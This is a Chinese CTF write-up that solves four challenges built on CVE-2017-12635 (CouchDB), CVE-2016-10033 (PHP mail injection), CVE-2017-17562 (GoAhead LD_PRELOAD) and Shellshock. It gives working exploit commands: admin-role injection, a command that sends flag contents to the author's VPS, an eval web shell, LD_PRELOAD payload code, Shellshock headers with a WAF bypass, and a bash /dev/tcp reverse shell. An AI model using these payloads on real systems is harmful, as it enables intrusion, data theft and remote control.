@@ -1,0 +1,389 @@
+0x00 前言
+最近做题遇到了一些CVE的复现，其中不乏一些好题，今天介绍的是如下4个与CVE结合的题目：
+CVE-2017-12635(CouchDB)
+CVE-2016-10033(PHPMailer)
+CVE-2017-17562(GoAhead)
+CVE-2014-6271(shellshock)
+注：按照题目由简到难的顺序排列
+0x01 CVE-2017-12635(CouchDB)
+拿到题目后发现80端口无法访问，于是扫了一波端口
+发现5984开放
+搜了一下，发现是CouchDB漏洞
+然后发现2017的CVE：CVE-2017-12635
+即由于CouchDB基于Erlang的JSON解析器和基于JavaScript的JSON解析器的不同，可以在数据库中提交带有用于访问控制的角色的重复键的_users文档，包括表示管理用户的特殊情况_admin角色。 与CVE-2017-12636（远程执行代码）结合使用，可以使非管理员用户能够以数据库系统用户的身份访问服务器上的任意shell命令。
+JSON解析器的差异会导致行为：如果JSON中有两个角色密钥可用，则第二个将用于授权文档写入，但第一个角色密钥用于新创建的用户的后续授权。 按照设计，用户不能分配自己的角色。 该漏洞允许非管理员用户给自己的管理员权限。
+详细漏洞参照：
+https://cert.360.cn/warning/detail?id=0bc3f86b333bf27fe26fe6fdc8bda5f8
+于是我们可以创建一个管理员用户
+curl -X PUT 'http://192.168.5.39:5984/_users/org.couchdb.user:sky' --data-binary '{"type": "user","name": "sky","roles": ["_admin"],"roles": [],"password": "sky"}'
+然后我们就可以用管理员用户登录了，后面就是未授权漏洞的打法了：
+curl -X PUT 'http://sky:sky@192.168.5.39:5984/_config/query_servers/cmd' -d '"/usr/bin/curl http://你的vps/cat /home/flag.txt"'
+curl -X PUT 'http://sky:sky@192.168.5.39:5984/skytest
+curl -X PUT 'http://sky:sky@192.168.5.39:5984/skytest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}
+curl -X POST 'http://sky:sky@192.168.5.39:5984/skytest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
+过一会儿，flag就打到了vps上：
+flag{ByeBye_1VerY0n1_have8un}
+0x02 CVE-2016-10033(PHPMailer)
+拿到题目：http://192.168.5.69/
+是一个留言板界面
+本以为是XSS，尝试许久无果，又试了试文件泄露
+拿到源码,给出关键漏洞点：
+<?php
+if (isset($_POST['submit'])) {
+$email = isset($_POST['email']) ? trim($_POST['email']) : '';
+$title = isset($_POST['title']) ? trim($_POST['title']) : '';
+$content = isset($_POST['content']) ? trim($_POST['content']) : '';
+if (chkEmail($email) && chkTitle($title) && chkContent($content)) {
+$to = 'ambulong@vulnspy.com';
+$subject = "收到来自 {$email} 的留言";
+$msg = "{$title}
+{$content}
+From: {$email}";
+$headers = 'From: ' . $email . "\r
+" . 'Reply-To: ' . $email . "\r
+" . 'X-Mailer: PHP/' . phpversion();
+$options = sprintf('-f%s', $email);
+if (mail($to, $subject, $msg, $headers, $options)) {
+echo "留言成功";
+} else {
+echo "留言失败";
+}
+}
+exit;
+}
+其中
+mail($to, $subject, $msg, $headers, $options)
+正是经典的
+CVE-2016-10033
+PHPMailer 命令执行漏洞
+给出一篇分析链接：
+http://blog.csdn.net/wyvbboy/article/details/53969278
+简述这个漏洞点，就是对传给mail函数的第五个参数没有正确过滤：
+由于$options是通过$email拼接而来，我们可以使得$email中存在恶意代码，即可获取shell
+尝试：
+email=
+-sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php
+title=
+<?php eval($_GET[sky]);?>
+访问
+http://192.168.5.69/skyskysky.php
+发现文件写入成功
+00040 <<< To: ambulong@vulnspy.com
+00040 <<< Subject: 收到来自 -sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php 的留言
+00040 <<< X-PHP-Originating-Script: 0:index.php
+00040 <<< From: -sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php
+00040 <<< Reply-To: -sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php
+00040 <<< X-Mailer: PHP/5.6.32
+00040 <<<
+00040 <<< 00040 <<< skyskytest.phpskyskytest.phpskyskytest.phpskyskytest.phpskyskytest.phpskyskytest.phpskyskytest.php
+00040 <<< From: -sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php
+00040 <<< [EOF]
+00040 >>> collect: Cannot write ./dfw0S539g0000040 (bfcommit, uid=48, gid=48): Permission denied
+00040 >>> queueup: cannot create queue file ./qfw0S539g0000040, euid=48, fd=-1, fp=0x0: Permission denied
+尝试一下命令执行
+view-source:http://192.168.5.69/skyskysky.php?sky=system(%22ls%22);
+发现成功执行
+00040 <<< 123.php
+flag.php
+index.php
+sky.php
+skyskysky.php
+skytest.php
+sss.php
+style.css
+testsky.php
+xxx.php
+读取flag
+view-source:http://192.168.5.69/skyskysky.php?sky=system(%22cat%20flag.php%22);
+00040 <<< <?php
+//flag{d1663b0e859c1cb1705099fa560944c0}
+?>
+0x03 CVE-2017-17562(GoAhead)
+这题拿到题目发现无法访问，扫了下端口，发现是8080端口开放
+进去后可以看见Hello gogogo
+感觉没什么用，抓了个包看看，发现是goahead
+于是搜了一波，发现有CVE:
+GoAhead服务器 远程命令执行漏洞(CVE-2017-17562)
+该漏洞源于在初始化CGI脚本环境时使用了不受信的HTTP请求参数，会对所有启用了动态链接可执行文件（CGI脚本）的用户造成影响。在此过程中，当CGI脚本调用glibc动态链接器时，特殊变量LD_PRELOAD可被注入滥用，从而导致远程代码执行。该漏洞是个典型的环境变量案例，能推广应用到其它不安全的软件架构漏洞发现中。
+而更详细的漏洞介绍，参照Freebuf的一篇文章
+http://www.freebuf.com/vuls/158089.html
+漏洞利用也非常简单
+payload.c
+c
+# PoC/payload.c
+#include <unistd.h>
+static void before_main(void) __attribute__((constructor));
+static void before_main(void)
+{
+write(1, "Hello: World!
+", 14);
+}
+然后gcc成so文件：gcc -shared -fPIC ./payload.c -o payload.so
+然后攻击
+curl -X POST --data-binary @payload.so http://ip/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i
+可以得到回显
+类似于如下：（当时没截图= =随便找了个差不多的）
+HTTP/1.1 200 OK
+Date: Sun Dec 17 13:08:20 2017
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Frame-Options: SAMEORIGIN
+Pragma: no-cache
+Cache-Control: no-cache
+hello: World!
+Content-type: text/html
+只要出现hello: World!就说明攻击成功了
+那么下面构造我们的攻击payload
+首先是找文件的绝对路径
+c语言实现执行命令的脚本网上一搜一大堆，我的没保存，这里就不赘述了
+最后发现是www目录下的goahead文件夹
+然后读文件
+c
+#include "stdio.h"
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+static void before_main(void) __attribute__((constructor));
+static void before_main(void){
+char filename[] = "/var/www/goahead/cgi-bin/hello.cgi";
+FILE *fp;
+char StrLine[1024];
+if((fp = fopen(filename,"r")) == NULL)
+{
+printf("error!");
+return -1;
+}
+while (!feof(fp))
+{
+fgets(StrLine,1024,fp);
+printf("%s
+", StrLine);
+}
+fclose(fp);
+}
+即可拿到flag
+curl -X POST --data-binary @payload.so http://192.168.5.42:8080/cgi-bin/hello.cgi?LD_PRELOAD\=/proc/self/fd/0 -i
+HTTP/1.1 200 OK
+Server: GoAhead-http
+Date: Sun Jan 21 04:31:28 2018
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Frame-Options: SAMEORIGIN
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Hello GOGOGO#!/usr/bin/perl
+print "Content-Type: text/html
+";
+print "Hello GOGOGO";
+#flag{ef9f1f880e1f001bedd32bfc52674128}
+0x04 CVE-2014-6271(shellshock)
+给出题目链接：
+https://command-executor.hackme.inndy.tw/
+个人认为这是一道非常好的题目，首先说一下考察点
+1.文件包含读源码
+2.代码分析结合CVE
+3.CVE导致的命令执行
+4.写入文件/反弹shell
+5.思考c文件的解法
+6.重定向获取flag
+拿到题目后随便点一点：
+https://command-executor.hackme.inndy.tw/index.php?func=ls
+https://command-executor.hackme.inndy.tw/index.php?func=cmd
+https://command-executor.hackme.inndy.tw/index.php?func=untar
+然后在
+发现可以遍历目录，但限制的很死，只能执行ls和env，但是此时发现了有趣的一点
+-rw-r--r-- 1 root root 1163 Jan 9 11:05 cmd.php
+-rw-r--r-- 1 root root 2201 Jan 9 11:32 index.php
+-rw-r--r-- 1 root root 515 Jan 9 11:05 ls.php
+-rw-r--r-- 1 root root 658 Jan 19 08:25 man.php
+-rw-r--r-- 1 root root 588 Jan 9 11:05 untar.php
+这里的ls,untar,cmd很可能是前面func参数包含进来的
+随即想到试一试文件包含，看看可否读文件
+https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index
+果不其然，可以拿到文件源码，这里给出最关键的index.php，其余的帮助并不大
+index.php
+<?php
+$pages = [
+['man', 'Man'],
+['untar', 'Tar Tester'],
+['cmd', 'Cmd Exec'],
+['ls', 'List files'],
+];
+function fuck($msg) {
+header('Content-Type: text/plain');
+echo $msg;
+exit;
+}
+$black_list = [
+'\/flag', '\(\)\s*\{\s*:;\s*\};'
+];
+function waf($a) {
+global $black_list;
+if(is_array($a)) {
+foreach($a as $key => $val) {
+waf($key);
+waf($val);
+}
+} else {
+foreach($black_list as $b) {
+if(preg_match("/$b/", $a) === 1) {
+fuck("$b detected! exit now.");
+}
+}
+}
+}
+waf($_SERVER);
+waf($_GET);
+waf($_POST);
+function execute($cmd, $shell='bash') {
+system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
+}
+foreach($_SERVER as $key => $val) {
+if(substr($key, 0, 5) === 'HTTP_') {
+putenv("$key=$val");
+}
+}
+$page = '';
+if(isset($_GET['func'])) {
+$page = $_GET['func'];
+if(strstr($page, '..') !== false) {
+$page = '';
+}
+}
+if($page && strlen($page) > 0) {
+try {
+include("$page.php");
+} catch (Exception $e) {
+}
+}
+注意到一个很可疑的函数putenv()
+结合env可以很快联想到2014年的一个重大漏洞：
+CVE-2014-6271
+破壳（ShellShock）漏洞
+给出Freebuf的分析链接
+http://www.freebuf.com/articles/system/45390.html
+确定了漏洞，就是尝试可用exp的时候了，这时候可以容易google到
+这样一篇文章:
+https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php
+其中重点的一段如下:
+可以清楚看到这样一个payload：
+wget --header="X-Exploit: () { :; }; echo Hacked" -q -O - http://127.0.0.1/shock.php
+并且和这个测试样本和我们题目中给出的代码十分相似:
+foreach($_SERVER as $key => $val) {
+if(substr($key, 0, 5) === 'HTTP_') {
+putenv("$key=$val");
+}
+}
+于是我们先去尝试一下适用性：
+可以发现我们被waf拦截了：
+\(\)\s*\{\s*:;\s*\}; detected! exit now.
+回去分析index.php的waf过滤点
+$black_list = [
+'\/flag', '\(\)\s*\{\s*:;\s*\};'
+];
+function waf($a) {
+global $black_list;
+if(is_array($a)) {
+foreach($a as $key => $val) {
+waf($key);
+waf($val);
+}
+} else {
+foreach($black_list as $b) {
+if(preg_match("/$b/", $a) === 1) {
+fuck("$b detected! exit now.");
+}
+}
+}
+}
+可以看到如上一个黑名单，
+我们的
+X-Exploit: () { :; };
+正是被这个黑名单禁止了，但是这样的waf存在极大隐患，我们只要加个空格就可以轻松绕过：
+X-Exploit: () { : ; };
+我们再次攻击一次试试：
+wget --header="X-Exploit: () { : ; }; echo Hacked" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+可以看到Hacked成功回显
+于是我们开始执行命令，需要注意的是，shellshock执行命令，需要加上/bin/
+比如cat命令要写成/bin/cat
+直接cat是不能成功的
+于是我们尝试读/etc/passwd
+wget --header="X-Exploit: () { : ; }; /bin/cat /etc/passwd" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+可以发现命令成功执行，所以下面我们的思路很清晰，找到flag并读取就行了
+而之前提到，这个题目本身自带ls，所以可以轻松查目录，容易发现flag在根目录
+https://command-executor.hackme.inndy.tw/index.php?func=ls&file=../../../../../../
+-r-------- 1 flag root 37 Jan 9 11:05 flag
+-rwsr-xr-x 1 flag root 9080 Jan 19 08:27 flag-reader
+-rw-r--r-- 1 root root 653 Jan 9 11:05 flag-reader.c
+我们尝试cat一下flag文件
+wget --header="X-Exploit: () { : ; }; /bin/cat ../../../../../../flag" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+此时又触发了waf
+回显打出
+\/flag detected! exit now.
+我们依旧被上面那个黑名单给禁止了！
+那么有没有办法绕过/flag呢？
+这里给出2个思考路线：
+1.shell拼接，比如a=/fl;b=ag;c=a+b这样（此处写的不严谨，有兴趣可以自己去研究一下)
+2.通配符绕过
+这里我选择第二点：
+wget --header="X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+但这次并没有回显打出，回去查看文件权限
+-r-------- 1 flag root 37 Jan 9 11:05 flag
+发现只有root才能读
+这时就郁闷了，但是下面还有一个c写的flag-reader引起了我的关注，我们读一下他
+wget --header="X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+打出回显:
+#include <unistd.h>
+#include <syscall.h>
+#include <fcntl.h>
+#include <string.h>
+int main(int argc, char *argv[])
+{
+char buff[4096], rnd[16], val[16];
+if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
+write(1, "Not enough random
+", 18);
+}
+setuid(1337);
+seteuid(1337);
+alarm(1);
+write(1, &rnd, sizeof(rnd));
+read(0, &val, sizeof(val));
+if(memcmp(rnd, val, sizeof(rnd)) == 0) {
+int fd = open(argv[1], O_RDONLY);
+if(fd > 0) {
+int s = read(fd, buff, 1024);
+if(s > 0) {
+write(1, buff, s);
+}
+close(fd);
+} else {
+write(1, "Can not open file
+", 18);
+}
+} else {
+write(1, "Wrong response
+", 16);
+}
+}
+审计这个c，大致原理就是：1秒之内把他输出的再输入回去，就可以打出文件内容
+此时我们的思路很简单，运行这个c，再把这个c输出在1s内再输回去，但是纯靠这样的交互，速度极慢，所以容易想到，要不要拿个shell？
+这里给出2种拿shell的思路
+1.反弹shell
+2.找到可写目录，并写入文件，利用文件包含即可
+这里我选择反弹shell(因为后面还会写文件，所以这里选择反弹，就不写了)
+wget --header="X-Exploit: () { : ; }; /bin/bash -i >& /dev/tcp/你的ip/11122 0>&1" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+然后一会儿就能收到shell
+而下面就只要解决如何在1s内输入c文件输出的结果这个问题了
+这里我选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的
+我们先去探索可写目录，容易发现/var/tmp具有写权限
+我们测试一下
+wget --header="X-Exploit: () { : ; }; echo 'sky' > /var/tmp/sky" -q -O - "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+即可发现该目录可写
+我的做法：
+flag-reader flag > /var/tmp/skyflag < /var/tmp/skyflag
+即可在skyflag中读到flag
+FLAG{W0w U sh0cked m3 by 5h3115h0ck}
+（完）
